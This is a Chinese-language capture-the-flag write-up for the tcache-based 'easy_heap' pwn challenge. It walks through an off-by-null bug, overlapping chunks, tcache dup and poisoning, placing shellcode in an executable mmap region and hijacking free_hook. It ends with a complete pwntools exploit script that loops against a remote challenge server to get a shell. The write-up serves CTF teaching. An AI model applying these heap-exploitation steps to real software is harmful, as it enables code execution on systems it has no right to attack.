## **（一）** **写在开篇**

本期分享一道来自tcache attack的pwn赛题。此题属于堆利用范畴内综合性较强的一道题目，大家可以从中了解到很多与堆相关的攻击手段。

 **赛题链接：https://github.com/zszcr/ctfrepo/tree/master/tcache/easy_heap**

##  **（二）** **解题过程**

 **1\. 保护策略。**

![](https://image.3001.net/images/20230426/1682475512_644889f8e15f3ecd7e4fe.png!small)
**2\. 漏洞所在。**

![](https://image.3001.net/images/20230426/1682475525_64488a05eb1d9b3b9e126.png!small)
**3\. 在input函数中，存在一个off by null的漏洞。同时，执行mmap程序后映射出一段可读、可写和可执行的地址，将其打印。**

 **4 解题思路：**

由于题目映射出了一段可读、可写和可执行的区域，并且没有开启沙箱。此时我们若在此处便写入shellcode，待后续我们劫持free_hook时，就可以无需写入libc中的system地址，而是直接填写shellcode的地址即可。

但是，此题不存在show函数。小星猜测出题人极大可能是没有打算让我们去泄露libc地址。猜测依据：若我们攻打io leak，libc地址肯定会被泄露。

所以此题主要还是以在mmap映射的内存中写入shellcode以及成功申请free_hook后，在free_hook中写入shellcode的地址为解题方向。

 **5\. 如何在mmap映射的内存中写入shellcode？**

我们肯定是可以通过攻打tcache dup+tcache poisoning后，将mmap映射的内存成功申请出来。但由于题目不存在UAF漏洞，如果利用off
by null来攻打tcache dup，过程虽然繁琐，但最终还是能够达到目标。

（1）首先，申请十个堆块，再释放其中的七个以填满tcache bin。值得注意的是，我们需要保留一个堆块，防止后续堆块进入unsorted bin后和top
chunk合并。除此以外，我们还需要利用剩余三个堆块，在通过off by null的方式完成堆块合并后，做一个堆块重叠。

编辑前的堆块和bins布局如下所示。

![](https://image.3001.net/images/20230426/1682475547_64488a1b9e96a9d48c98b.png!small)![](https://image.3001.net/images/20230426/1682475559_64488a271ae3291b3b204.png!small)

合并后的情况如下所示。

![](https://image.3001.net/images/20230426/1682475572_64488a34539dc77c54425.png!small)（2）做出堆块重叠后，因为是2.27的libc，所以我们直接打tcache
dup+tcache poisoning即可。注意：在此之前需要如下图所示清空tcache bin。

![](https://image.3001.net/images/20230426/1682475584_64488a40219d817717e3c.png!small)（3）申请mmap映射出的内存。

![](https://image.3001.net/images/20230426/1682475594_64488a4adc97d3620904a.png!small)（4）shellcode已被写入内存。

![](https://image.3001.net/images/20230426/1682475698_64488ab22ce37a0bf3ffa.png!small)

 **6.如何成功申请free_hook？**

（1）在不清楚libc地址的情况下，如果要把free_hook申请出来，我们只能利用unsorted bin里残留的fd指针。

（2）在布局之前，我们首先需要把此前已申请出来的chunk全部释放至unsorted
bin中，然后再进行申请操作。此时我们已无需再管该部分的内存，重新执行add函数并进行新的布局即可。 **但需要注意的是，由于此前我们攻打了tcache
dup，导致0x100这条链已被损坏，所以后续我们也已无法再使用此链。**

（3）利用思路再进行一次堆块重叠的布局，此次不打tcache dup，而是直接先将spy chunk(堆块重叠的chunk)释放，使unsorted
bin的fd指针落在spy chunk上，这样tcache bin链上就能够出现libc的地址。

（4）申请spy chunk的内存。因为我们已经造成了堆块重叠，所以可以让spy chunk处于tcache链上后，再把它申请出来进行编辑。

（5）控制tcache链上的fd指针，把main_arena+88的地址修改为free_hook的地址后，将其申请出来。备注：该地址需要爆破半个字节。

（6）最初布局如下所示。

![](https://image.3001.net/images/20230426/1682475713_64488ac1df7f28c7ae818.png!small)（7）利用off
by null如下所示。

![](https://image.3001.net/images/20230426/1682475728_64488ad02836569d7b231.png!small)（8）进行合并后如下所示。

![](https://image.3001.net/images/20230426/1682475738_64488adacfd4718e145e9.png!small)（9）释放spy
chunk，并让其进入tcache bin后如下所示。

![](https://image.3001.net/images/20230426/1682475749_64488ae5efd6efbbf5d33.png!small)（10）执行add函数申请内存，保证使unsorted
bin中的fd指针落在tcache链的fd指针上。

![](https://image.3001.net/images/20230426/1682475762_64488af2482e7a3a46edc.png!small)（11）最终将spy
chunk内存成功申请出来。

 **备注：**

（1）此处不能正好是spy chunk原来的尺寸，否则它就可以直接从tcache bin中获得。例如：在我的脚本中，spy
chunk的大小是0x90，我就在此处申请一个0x30的chunk，以便对这片内存进行操作。

（2）编辑刚刚所申请的0x30的chunk，将main_arena+88改为free_hook的地址，注意此处需要爆破半个字节。若是在本地进行调整，大家可以关闭ASLR，这样就无需进行爆破操作了。

（3）这里不再演示爆破过程。最后一步为将爆出来的free_hook地址申请出来，写入最开始mmap映射的地址，并执行free函数以获取shell。

（4）最终exp如下所示：

from tools import *

#context.log_level='debug'

context.arch='amd64'

d_a=0xC85

d_e=0xC9D

d_d=0xC91

def add(size):

p.sendlineafter(">> ",str(1))

p.sendlineafter("Size: ",str(size))

p.recvuntil("Pointer Address ")

addr=int(p.recv(14),16)

return addr

def delete(index):

p.sendlineafter(">> ",str(2))

p.sendlineafter("Index: ",str(index))

def edit(index,content):

p.sendlineafter(">> ",str(3))

p.sendlineafter("Index: ",str(index))

p.sendlineafter("Content: ",content)

def pwn():

p.recvuntil("Mmap: ")

mmap_addr=int(p.recv(12),16)

log_addr('mmap_addr')

for i in range(10):

add(0xf8)

add(0x40)#prevent merge chunk

for i in range(8):

delete(i)

#debug(p,'pie',d_d,d_a,d_e)

edit(8,b'a'*0xf0+p64(0x200))

delete(9)

for i in range(7):

add(0xf8)

#delete(8)

add(0xf8)

add(0xf8)

delete(8)

delete(9)#double free

add(0xf8)

add(0xf8)

#add(0xf8)

edit(8,p64(mmap_addr))

add(0xf8)

add(0xf8)

edit(12,shellcode_store("shell_64"))

#上述在完成往mmap_addr写入shellcode

for i in range(9):

delete(i)

add(0x9f0)

add(0x4f8)

add(0x88)#spy chunk

add(0x4f8)

add(0x10)#prevent chunk

delete(1)

edit(2,b'a'*0x80+p64(0x590))

delete(3)

delete(2)

add(0x4f8)

add(0x30)

add(0x40)

edit(2,b'\xe8\x18')

add(0x88)

add(0x88)

edit(6,p64(mmap_addr))

delete(0)

p.interactive()

i=0

while 1:

try:

#p=remote("node4.buuoj.cn",25780)

log('----------------->',str(i))

p,e,libc=load("a","node4.buuoj.cn:25780")

pwn()

except:

p.close()

i=i+1

![](https://image.3001.net/images/20230426/1682475774_64488afeab7e1c72b6b66.png!small)
**溢出成功！**

